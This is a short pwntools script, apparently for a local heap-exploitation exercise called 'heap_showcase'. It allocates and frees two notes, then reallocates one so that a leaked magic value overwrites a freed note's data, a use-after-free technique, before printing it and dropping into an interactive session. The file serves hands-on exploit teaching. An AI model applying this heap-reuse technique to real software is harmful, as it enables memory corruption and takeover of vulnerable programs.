from pwn import *

context.terminal = ['tmux', 'split', '-h']

r = process('./heap_showcase')

def addnote(size, content):
    r.info('Add note of size %d with content: %r', size, content)
    r.sendlineafter("choice: ", "1")
    r.sendlineafter("Note size: ", str(size))
    r.sendlineafter("Content: ", content)

def delnote(idx):
    r.info('Delete note at index %d', idx)
    r.sendlineafter("choice: ", "2")
    r.sendlineafter("Index: ", str(idx))

def printnote(idx):
    r.info('Print note at index %d', idx)
    r.sendlineafter("choice: ", "3")
    r.sendlineafter("Index: ", str(idx))


magic = int(r.recvline(), 16)

addnote(16, "0123456789abcdef")
addnote(16, "fedcba9876543210")

# gdb.attach(r, "b 93\nc\n")

delnote(0)
delnote(1)

addnote(8, p32(magic))

printnote(0)

r.interactive()
